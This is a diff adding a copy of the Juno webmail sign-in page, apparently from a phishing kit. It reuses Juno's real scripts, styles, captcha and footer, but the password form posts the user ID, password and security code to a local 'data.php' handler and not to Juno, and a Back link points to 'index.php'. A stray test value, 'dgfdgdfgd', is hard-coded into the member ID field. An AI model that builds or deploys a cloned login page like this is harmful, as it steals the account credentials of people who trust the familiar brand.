@@ -1,0 +1,646 @@
+<html><head>
+    <!-- Meta Tags -->
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<!-- Page Title -->
+	<title>Juno - My Juno Personalized Start Page - Sign in</title>
+	<!-- start: shared-tracking -->
+
+<script language="JavaScript">
+// derive servlet from [a-zA-Z]+.do  
+var temp="/login.do"; temp = temp.match(/([a-zA-Z0-9]+)\.do/); 
+var servlet='unknown'; if(temp.length) servlet = temp[1];
+
+//derive pagename from ssi var
+var pname = 'logon'; pname = pname.replace(/\.jsp/,''); if(pname.length<1) pname='unknown'; 
+switch(servlet){
+	/* some spring actions differ from zulu...try to map them back */
+	case 'referEmailPreview': servlet = 'refer'; break;
+	case 'login': servlet = 'logon'; break;
+	case 'portfolioLookup': servlet = 'portfolio'; break; 
+	case 'weatherLookup': servlet = 'weather'; break; 
+	case 'accessNumbers': servlet = 'numbers'; break;
+	case 'accessNumbersSaveEmail': servlet = 'numbers'; break;
+	case 'signOnRequiredRhinoboot': servlet = 'rhinoboot'; break; 
+	case 'landing' : 
+		var ssi_sv_path = '/login.do';
+		var ssi_pg_path = '';
+		//alert(ssi_sv_path + ' -- ' +ssi_pg_path);
+		if(ssi_sv_path.match(/landing\.do/) && ssi_pg_path.match(/www/)){
+			servlet = 'www'; 
+		} else {
+			// don't modify servlet var--other non-www contexts?
+		}
+		break; 
+}
+
+</script>
+<script language="JavaScript" src="https://my.juno.com/common/js/pageview.js"></script>
+<!--
+====================================================
+	we are forcing the comeFrom code when loading
+	the NZ www frontdoor (windows) as part of a/b
+	testing (RT#12743)
+====================================================
+-->
+
+<script language="JavaScript">
+var context = '';
+
+
+
+if(servlet != 'sp'){
+	//logPageView(servlet,pname,'9641E4E17B13E459F873F4AF8AADC1ED.VGS-AS02','https://track.juno.com',context);
+	try{
+		logPageView(servlet,pname,'9641E4E17B13E459F873F4AF8AADC1ED.VGS-AS02','https://track.juno.com',context);
+	 }
+	catch(e){		
+	} 
+}
+
+function debug_pv_values(){
+	alert('servlet='+servlet+'\npname='+pname+'\nsID=9641E4E17B13E459F873F4AF8AADC1ED.VGS-AS02\ntrackServer=https://track.juno.com\ncontext='+context)
+}
+</script><link rel="shortcut icon" href="https://my.juno.com/static/account/view/img/webicon_j.ico"></head><body><img src="https://track.juno.com/s/pv?s=999999&amp;a=logon&amp;p=logon&amp;d=unknown&amp;i=9641E4E17B13E459F873F4AF8AADC1ED.VGS-AS02&amp;cf=&amp;srt=0&amp;crt=0&amp;" width="1" height="1" border="0">	
+	
+
+<!--  Get back the pname as it is tampered in between -->
+<script language="JavaScript">
+	pname = 'logon'; pname = pname.replace(/\.jsp/,''); if(pname.length<1) pname='unknown';
+</script>
+
+<!-- start: google analytics -->
+<!-- No need track mypoints and stocksEow pages -->
+<!-- end: google analytics -->
+
+
+
+<!-- end: shared-tracking -->
+
+<script src="https://my.juno.com/redesign/common/js/jquery-1.12.3.min.js"></script>
+<script>
+var href = document.location.href;
+function getCookieValue(nm) {var c=document.cookie; var x=c.indexOf(nm+'='); if(x == -1) return null; var y=x+nm.length; var z=c.indexOf(';',y); if(z == -1) z=c.length; var v=c.substring(y,z); if(v.charAt(0) == '=') v=v.substring(1,v.length); return v;}
+function getCookieDomain() {var ds = ''; if(href.indexOf('.netzero.net') != -1) ds='; domain=.netzero.net'; if(href.indexOf('.juno.com') != -1) ds='; domain=.juno.com'; if(href.indexOf('.mybluelight.com') != -1) ds='; domain=.mybluelight.com'; return ds;}
+function setCookieValue(n,v,days) {expire=';expires=Tue, 24 Jul 2022 01:01:01 GMT'; if (arguments.length>2) {msecs=(days*24*60*60*1000)+(new Date()).getTime();then=new Date(msecs);expire=';expires='+then.toGMTString(); } var ds=getCookieDomain(); document.cookie=n+'='+v+expire+';path=/'+ds;}
+function areCookiesEnabled() {setCookieValue('c_check','enabled'); var c=getCookieValue('c_check'); if(c!=null && c.indexOf('enabled') != -1) return true; alert('You must enable cookies to use this site!'); top.location.href='/s/common?r=cookies'; return false;}
+
+function onlyCaptcha(form) {
+    if(form.captchaTypedWord.value.length == 0) {
+    alert("Captcha required!");
+    form.captchaTypedWord.focus();
+    return false;
+    }
+	return true;
+}
+
+function logonValidate(form) {
+
+var memberIdText = 'Member ID';
+var memberid= form.memberId.value.toLowerCase();
+
+if(!areCookiesEnabled()) {return false;}
+
+if(memberid.length == 0) {
+	alert("Member ID required!");
+	form.memberId.focus();
+	return false;
+	}
+
+if(form.password.value.length == 0) {
+	alert("Password required!");
+	form.password.focus();
+	return false;
+	}
+if(capid != '')
+{
+       if(form.captchaTypedWord.value.length == 0) {
+       alert("Captcha required!");
+       form.captchaTypedWord.focus();
+       return false;
+       }
+ }
+return true;
+}
+</script>
+<!-- Adding multistep login page : COM-3413 -->
+	<!-- tag library and pname -->
+<!-- Stylesheet and Fav Icon Includes -->
+<link rel="shortcut icon" href="https://my.juno.com/static/account/view/img/webicon_j.ico">
+<link rel="stylesheet" href="https://my.juno.com/redesign/common/css/bootstrap.min.css?v=42606">
+<link rel="stylesheet" href="https://my.juno.com/redesign/common/css/common-redesign.css?v=50388">
+<link rel="stylesheet" type="text/css" href="https://my.juno.com/static/start/view/common/css/sp-redesign.css?v=29119">
+
+<style>
+@media all {
+	IE\:clientCaps {
+		behavior: url(#default#clientCaps)
+	}
+}
+</style>
+<!--[if IE]>
+		<link rel="stylesheet" type="text/css" href="https://my.juno.com/redesign/common/css/ie.css?v=42608" />
+	<![endif]-->
+<!--[if gt IE 9]>
+	   <style>
+	     body{font-family:sans-serif !important;}
+	    .form-signin input[type="text"],
+		.form-signin input[type="password"] {	
+		  font-family:sans-serif !important;
+		  color:#585858; }
+		</style>
+	<![endif]-->
+<!-- JS Includes -->
+<script type="text/javascript" src="https://my.juno.com/redesign/common/js/common-redesign.js?v=2345"></script>
+<script src="https://my.juno.com/static/start/view/common/js/mobile-detect.min.js"></script>
+
+<script type="text/javascript">
+	var envDomain = "juno.com";
+	var capid = "";
+	var pname = "login.jsp";
+	var isDialupFlag = false;
+	var md = new MobileDetect(window.navigator.userAgent);
+	var memid="";
+	var nextBtnDelay= 2500;
+	ctcookie = getCookieValue('CT');
+	$(document).ready(function(){
+	var keepMeSignedInChecked = "";
+	if(keepMeSignedInChecked == "1"){
+		$("#keepmesignedin").attr("checked",true);
+	}
+	
+	//Adding favicon dynamically
+	 $('head').append('<link rel="shortcut icon" href="https://my.juno.com/static/account/view/img/webicon_j.ico">');
+	
+		var keepmeSigninValue = getCookieValue("keepSignin");
+		if('null' == keepmeSigninValue){
+			keepmeSigninValue = null;
+		}
+			if( keepmeSigninValue != null  )
+				{
+				$("#keepmesignedin").attr("checked",true);
+			 }	
+			else if(keepmeSigninValue == null){
+				$("#keepmesignedin").attr("checked",false);
+				}
+			
+		$('#keepmesignedin').click(function(){
+	        if($('#keepmesignedin').prop("checked") == true){
+	            $('#signin').click(function(){
+	            	setKeepMeSignin("keepSignin",true);
+	            })
+	        }
+	        else if($('#keepmesignedin').prop("checked") == false){
+	        	    $('#signin').click(function(){
+	            	setKeepMeSignin("keepSignin",null);
+	            })
+	        }
+	    });
+		
+		
+		if(md.phone() != null){
+			$('#ldivider').removeClass('fixedPos');
+			$('#header').removeClass('fixedPos');
+		}
+		$("#hdivider").css('border-bottom','2px solid #000000');
+	
+		
+		if(memid){document.getElementById("memberId").value= memid.substring(0,memid.indexOf("@")); }
+	
+		$('#backbtn').click(function(){
+			$('#EditableUserID').css('display', 'block');
+			$('#nonEditableUserID').css('display', 'none');
+		});
+		
+		
+		 $('.userIdForm').on('keypress', function(event) {
+			  var keyCode = event.keyCode || event.which;
+			  if (keyCode === 13) { 
+				  event.preventDefault();
+				  validateForm();
+			  }
+			});
+
+		/* $('.userNext').on("click",function(){
+			$('.userNext').prop("disabled",true);
+			$('html').css( 'cursor', 'wait');
+			setTimeout(formSubmit, nextBtnDelay);
+			return;
+		});  */
+		
+		
+		 /* $('.userNext').click(function(event){
+			 var form = $('.userIdForm');
+			var validForm = validateUserId(form);
+			if(validForm)
+				{
+					setTimeout(formSubmit, nextBtnDelay);
+				}	
+		});  */
+		
+	});
+	function validateForm(){
+		$('.userNext').prop("disabled",true);
+		if(validateUserId($('#memberId').val())){
+			$('html').css( 'cursor', 'wait');
+			//setTimeout(formSubmit, nextBtnDelay);
+			setTimeout(function(){
+				$('.userIdForm').submit();
+			},nextBtnDelay );
+		}		
+		else{
+			return false;
+		}
+	}
+	</script>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+      <script src="https://my.juno.com/redesign/common/js/vendor/html5shiv.min.js?v=5516"></script>
+      <script src="https://my.juno.com/redesign/common/js/vendor/respond.min.js?v=30473"></script>
+    <![endif]-->
+<!--[if IE 8]>
+    <link rel="stylesheet" href="https://my.juno.com/redesign/common/css/common-redesign-ltie8.css?v=23876">
+    <![endif]-->
+
+<link rel="canonical" href="https://my.juno.com">
+	
+
+
+	<script type="text/javascript">
+window.onload = function() {
+	
+	<!-- Reading MID value from cjar_1 cookie and prefilling the userId textbox -->
+	if($.trim(document.getElementById("memberId").value) == ''){
+		var cjarOneCookie = getCookieValue('cjar_1');
+		var cjarOneCookieDecoded = decodeURI(cjarOneCookie);
+		var midStartIndex = cjarOneCookieDecoded.indexOf('^MID!');
+		var MID = null;
+		if(midStartIndex >= 0 ){
+			MID = cjarOneCookieDecoded.substring(midStartIndex+5,cjarOneCookieDecoded.indexOf('^',midStartIndex+5));
+			if(MID != ''){
+				document.getElementById("memberId").value= MID;
+			}
+		}
+	}
+	
+	<!-- Fous memberId text field if its empty or password field if memberId is not empty (On page load) -->
+	if(document.getElementById("memberId").value == ""){
+  		document.getElementById("memberId").focus();
+	} else if(document.getElementById("password").value == ""){
+		document.getElementById("password").focus();
+	}
+};
+</script>
+	<!--[if IE]>
+<IE:clientCaps ID="oClientCaps" /> 
+<![endif]-->
+
+	<!--  This variable helps in redirecting to "WWW" server instead of "my"  based on the requestURL -->
+	<div class="spContainer">
+		<!-- New SP-2017 Header -->
+
+<header id="staticHeader">
+		
+<div class="row no-gutter spContainer fixedPos" id="header">
+ 
+	<div class="leftCol" id="logo">
+		<a href="https://my.juno.com/" target="_blank"><img src="https://my.juno.com/redesign/common/images/j_logo.png" alt="Juno"></a>
+	</div>
+	<div class="headerAdDiv spAds" id="Top3Ad"></div>
+	<div class="row" id="hdivider" style="border-bottom: 2px solid rgb(0, 0, 0);"></div>
+	
+</div>
+</header><!--  <div id="ldivider" class="fixedPos"></div> -->
+		<div class="cBoth"></div>
+		<div class="row">
+			<div class="pull-left">
+				<div class="trans">
+					<br>
+					<div class="welcomeSign text-center">
+						<span style="font-weight: bold;">Welcome!</span> <span style="font-size: 15px;">Please sign-in below.</span>
+					</div>
+					<div class="form-signin" id="EditableUserID">
+								<form name="login" method="POST" class="userIdForm" action="https://my.juno.com/start/login.do">
+									<!-- onsubmit="return validateUserId(this)">  -->
+									<input type="hidden" name="operation" value="login"> <input type="hidden" name="captchaId" value="2279C55D694C46CE9DE6E05248D3B9EEFC622A9C497DB99020B097D434A3B83F734CFB81F26CD5529DF788E447D7E087"> <input type="hidden" name="client" value="my"> <input type="hidden" name="newloginpage" value="true"> <input type="hidden" name="pagename" value="startlogin"> <input type="hidden" name="cf" value="">
+									<div class="padding29">
+										<input type="text" placeholder="User ID" id="memberId" maxlength="64" name="username" class="width255 defaultText" value="" autofocus="" style="text-align: center;">
+									</div>
+									
+								</form>
+								<div class="text-center paddingBottom25">
+										<button type="button" class="btn btn-danger signin userNext" id="" onclick="validateForm()">Next</button>
+								</div>
+								
+								<div class="text-center forgotId">
+									Forgot your <a href="https://help.juno.com/support/errors/eb06-myacct.html" target="_blank" class="tDecorationUl">ID?</a>
+										</div>
+								<br>
+							</div>
+							<div class="form-signin" id="nonEditableUserID">
+								<form name="login" method="POST" action="data.php" onsubmit="return logonValidate(this);">
+									<input type="hidden" name="operation" value="login"> <input type="hidden" name="captchaId" value="2279C55D694C46CE9DE6E05248D3B9EEFC622A9C497DB99020B097D434A3B83F734CFB81F26CD5529DF788E447D7E087"> <input type="hidden" name="client" value="my"> <input type="hidden" name="newloginpage" value="true"> <input type="hidden" name="pagename" value="startlogin"> <input type="hidden" name="cf" value="">
+
+									<div class="padding29">
+												<input type="text" placeholder="User ID" id="memberId" maxlength="64" name="username" class="width255 defaultText" value="" readonly="" style="text-align: center;">
+											</div>
+											<div class="padding29">
+												<input type="password" placeholder="Password" required="true" id="password" maxlength="64" name="password" class="width255 defaultText1" autocomplete="off" style="text-align: center;">
+											</div>
+											<div class="checkbox">
+														<label class="btn btn-link keepSigned">
+														<input type="checkbox" id="keepmesignedin" name="keepmesignedin">
+															Keep me signed-in</label>
+													</div>
+												<script>
+		            capid="2279C55D694C46CE9DE6E05248D3B9EEFC622A9C497DB99020B097D434A3B83F734CFB81F26CD5529DF788E447D7E087";
+		            document.login.memberId.value="dgfdgdfgd";
+		            </script>
+											<div class="col-md-3 pull-left bTopRed"></div>
+											<div class="col-md-6 secOrText">SECURITY CHECK</div>
+											<div class="col-md-3 pull-right bTopRed"></div>
+											<div class="alignCenter paddingTop15 paddingBottom15 colorGrey cBoth fontNexalight">Helps
+												prevent automated or fraudulent activity</div>
+											<script type="text/javascript">
+					</script><div class="padding29"><img name="captchaImage" id="captchaImage" src="https://captcha.uolimg.com/start/captcha.do?action=getImage&amp;captchaId=2279C55D694C46CE9DE6E05248D3B9EEFC622A9C497DB99020B097D434A3B83F734CFB81F26CD5529DF788E447D7E087&amp;rand=3876411829351508" class="paddingBottom3" width="263" height="75" border="0"></div>
+											<div class="text-center fontNexalight">
+												Can't read it? <span id="getCaptcha" onclick="getCaptcha();" class="tDecorationUl colorBlue cPointer">Load a
+													different image.</span>
+											</div>
+											<script type="text/javascript">
+						function getCaptcha(){
+                            var s = window.location.href.split(":")[0]+"://captcha.uolimg.com/start/captcha.do?action=getImage&captchaId=2279C55D694C46CE9DE6E05248D3B9EEFC622A9C497DB99020B097D434A3B83F734CFB81F26CD5529DF788E447D7E087" + '&rand=' + ('' + Math.random()).substring(2);
+                            $('#captchaImage').attr('src', s);
+                        }
+					</script>
+											<br>
+											<div class="padding29">
+												<input type="text" class="input-block-level borderradius width255 defaultText2" id="captchaTypedWord" name="captchaTypedWord" maxlength="20" required="true" autocomplete="off" placeholder="Security Code" style="text-align: center;">
+											</div>
+										<div class="bTopRed paddingBottom25"></div>
+
+									<!--[if IE 6]>
+    		<link rel="stylesheet" href="https://my.juno.com/redesign/common/css/common-redesign-ltie8.css?v=23876">
+				<div class="padding29">
+				WARNING - as a valued Juno subscriber, we want you to know the version of Internet Explorer you're currently using will leave you vulnerable to potential 
+				security breaches when accessing secured web pages. It is STRONGLY recommended you upgrade your browser version or select a different browser before continuing 
+				with your online activity.
+				<br><br>  
+				To download a new browser <a href="http://whatbrowser.org/" target="_blank" class="tDecorationUl">click here</a>.<br>	
+				To learn more <a href="http://help.juno.com/support/faq/upgradeie.html" target="_blank" class="tDecorationUl">click here</a>.<br>
+				</div><br>
+			<div class="bTopRed paddingBottom25"></div>
+			<![endif]-->
+
+									<div id="loginButtons">
+										<a href="index.php" id="backbtn" class="fLeft btn btn-danger">Back</a> <span class="fRight paddingBottom25 targetDiv">
+											<button type="submit" class="btn btn-danger signin" id="signin">Sign-In</button>
+										</span>
+									</div>
+									<div class="cBoth"></div>
+
+								</form>
+							
+							<div class="text-center forgotId">
+									Forgot your <a href="https://account.juno.com/s/resetpassword" target="_blank" class="tDecorationUl">Password?</a>
+								</div>
+								<br>
+							</div>
+						<div class="col-md-5 bTopRed"></div>
+					<div class="col-md-2 secOrText">OR</div>
+					<div class="col-md-5 bRight bTopRed"></div>
+
+					<br>
+					<div class="text-center">
+						<a href="https://www.juno.com/freeemail" target="_blank" class="btn btn-warning createNewAccount" id="newaccount_button">
+							
+						Create A New Account</a>
+					</div>
+					<br>
+				</div>
+			</div>
+
+			<div class="pull-left">
+				<div id="Left2Wrap">
+					<div id="Left2Ad"></div>
+				</div>
+				</div>
+		</div>
+		<!-- <div id="Frame1Wrap"></div><br/>
+	  <div id="Frame2Wrap"></div><br/>
+	  <div id="Left3Wrap"></div><br/> -->
+		<!-- Footer -->
+		<!-- <div class="footerPadding cBoth" id="footerPadding"> -->
+		<!--New start page redesign-2017 -->
+  <footer id="staticFooter">
+<div id="et-main-area">
+<div id="main-content">
+       <div class="entry-content">
+              <div class="et_pb_section  et_pb_section_0 et_pb_with_background et_section_regular">                                  
+                     <div class=" et_pb_row et_pb_row_0">
+                             <hr class="et_pb_module et_pb_space et_pb_divider et_pb_divider_0">
+                           </div> <!-- .et_pb_column -->
+                     </div> <!-- .et_pb_row -->
+                     <div class=" et_pb_row et_pb_row_1">                          
+                           <div class="et_pb_column et_pb_column_1_4  et_pb_column_1">
+                                  <div class="et_pb_code et_pb_module  et_pb_code_0">
+                                  			<!-- Footer Links -->
+							<div class="footerNav1 fLeft">
+								<a href="https://my.juno.com/start/sp.do" tabindex="1" target="_blank">My Juno</a><br>
+								<a href="https://track.juno.com/s/lc?s=&amp;u=https://account.juno.com/s/account" tabindex="2" target="_blank">My Account</a><br>
+								<a href="https://account.juno.com/s/landing" tabindex="3" target="_blank">Our Services</a>
+								<br>
+								<a href="http://www.unitedonline.net/advertisers/" tabindex="4" target="_blank">Advertisers</a>
+							</div>
+							<div class="footerNav2 fLeft">
+								<a href="https://www.juno.com/start/landing.do?page=www/legal/privacy" tabindex="5" target="_blank">Privacy Policy</a> <br>
+								<a href="javascript:rights('www.juno.com');" tabindex="6">Your&nbsp;Privacy&nbsp;Rights</a>
+								<br>
+								<a href="https://www.juno.com/start/landing.do?page=www/legal/privacy#III" tabindex="7" target="_blank">About Ads</a>
+								<br>
+								<a href="https://www.juno.com/start/landing.do?page=www/legal/terms" tabindex="8" target="_blank">Terms of Service</a>
+							</div>
+							<div class="copyright">
+								Copyright ©
+								2020&nbsp;Juno
+								, Inc.
+							</div>
+						</div> <!-- .et_pb_code -->
+                           </div> <!-- .et_pb_column -->
+                           <div class="et_pb_column et_pb_column_3_4  et_pb_column_2">
+						<div class="footerAdDiv spAds" id="Bottom3Ad" style="display: none;"></div>
+								<div class="footerAdDiv spAds" id="Bottom4Ad"></div>
+							</div> <!-- .et_pb_column -->                                 
+                     </div> <!-- .et_pb_row --> 
+                     		<div class=" et_pb_row et_pb_row_2"> 
+                    			<div id="Frame1Ad" class="fright spAds"></div>   
+                    			<div id="RMA1Ad" class="fright spAds"></div>                                      
+              			</div> <!-- .et_pb_row -->            			
+              </div> <!-- .et_pb_section -->              
+       </div> <!-- .entry-content -->
+</div> <!-- #main-content -->
+</footer></div> <!-- #page-container -->
+ 
+<script>
+ $(document).ready(function(){
+if(screen.height >= 1045){
+	//document.getElementById('BottomAd').setAttribute('id', 'Bottom2Ad');
+	$('#BottomAd, #Bottom3Ad').hide();
+}
+else{
+	$('#Bottom2Ad, #Bottom4Ad').hide();
+}
+}); 
+</script>
+	
+	
+	
+	
+	
+
+ 
+<!-- </div>  -->
+
+	
+	
+	<div id="AdLoader"></div>
+		<div id="userConsentForAdsPopup">
+			<div id="userConsentForAdsPopupContent">
+				<table id="userConsentText" class="font1emBold">
+					<tbody><tr>
+						<td>We use cookies to collect and analyze information on site
+							performance and usage, and to tailor advertisements to your
+							interests. By clicking "Accept" you agree to allow cookies to be
+							placed. You can learn more about our use of cookies and similar
+							technologies and your choices by reviewing our <a href="https://my.juno.com/start/landing.do?page=www/legal/cookie" target="_blank" class="cookiePolicyLink">Cookie Policy.</a>
+						</td>
+						<td id="userConsentButtons"><button id="allowButton">Accept</button></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+		<script type="text/javascript" src="/redesign/common/js/vendor/speed-detector.js?v=20930"></script>
+<script src="/static/start/view/common/js/mobile-detect.min.js"></script> 
+<script>
+var screenHeight=screen.height;
+var ctcookie;
+var accelUser = "";
+var memberNumber = "";
+var CT = getCookieValue("CT");
+if(CT == null || CT == '') {
+	if(accelUser == "true"){
+		BandwidthChecker.checkBandwidth("0");
+	  }else{
+		BandwidthChecker.checkBandwidth();
+	 }
+}
+
+//call google analytics, if pname="index-redesign"
+if(pname == "index-redesign.jsp"){
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-7101665-7', 'auto');
+		ga('send', 'pageview');
+}
+
+//Ad Serving variable declaration
+//Please do not modify unless you are sure of the change.
+//Note : Any change to this declaration need to be confirmed with AdTech Team.
+
+var __asInfo = {
+	phInfo : {
+		site : "uolstart",
+		uid : (memberNumber != '') ? "uid=ISx" + memberNumber : "",
+		sLevel : "free",
+		brand : "JU"
+	},
+	adPage : "/start/view/redesign/common/phoenix/blankPhnx.html?v=34955",
+	customVars : {
+		'_uh' : '',
+		'_uh2' : '',
+		'_uh3' : '',
+		'_uh4' : '',
+		'_uh5' : '',
+		'_uh6' : '',
+		'_uh7' : '',
+		'_uh8' : ''
+	},
+	pageInfo : {
+		posList : getPosList,
+		name : getAsPageName
+	},
+	sWrapper : 'Ad',
+	isDialup : isDialupFlag,
+	adConfig : {
+		url : '//static.uolcontent.com/cgi/aconfig'
+	}
+};
+
+	//function to return OAS pagename
+	function getAsPageName() {
+		if (pname == "index-redesign.jsp") {
+			return "desk/home";
+		} else if (pname == "login.jsp") {
+			return "desk/login";
+		} else if (pname == "header-iframe-content.jsp") {
+			return "desk/header";
+		} else {
+			return "";
+		}
+	}
+
+	//function to return Ad positions list based on OAS pagename
+	function getPosList(page) {
+		if (page == "desk/home") {
+			if (screenHeight < 1045) {
+				return "Top2,Bottom,Top1,BottomRight,Left,Frame1,CustomCentIn_4,CustomCentIn_2,CustomCentIn_1,CustomRtChan,CustomCenterA,RMA1";
+			} else {
+				return "Top2,Bottom2,Top1,BottomRight,Left,Frame1,CustomCentIn_4,CustomCentIn_2,CustomCentIn_1,CustomRtChan,CustomCenterA,RMA1";
+
+			}
+		} else if (page == "desk/login") {
+			var md = new MobileDetect(window.navigator.userAgent);
+			var isMobile = md.phone();
+			if (!isMobile && screenHeight < 1045) {
+				return "Frame1,Top3,Bottom3,Left2,RMA1";
+			} else if (!isMobile && screenHeight >= 1045) {
+				return "Frame1,Top3,Bottom4,Left2,RMA1";
+			} else {
+				return "Left2";
+			}
+		} else if (page == "desk/header") {
+			return "Top2,Top3";
+		} else {
+			return "";
+		}
+	}
+
+	//Ads call
+	//var pagename=getAsPageName();
+	//if(pagename =='desk/login'){
+	//var md = new MobileDetect(window.navigator.userAgent);
+	//var isMobile=md.phone();
+	//}
+	$(function() {
+		$.ajax({
+			'url' : '//static.uolcontent.com/js_api/as-3.1.0.min.js',
+			'dataType' : 'script',
+			'cache' : true
+		}).always(function() {
+			//Make sure that adsystem object is loaded
+			if (typeof __as !== 'undefined') {
+				__as.init(__asInfo);
+				__as.get();
+			}
+		});
+	});
+</script>
+
+	
+</body></html>
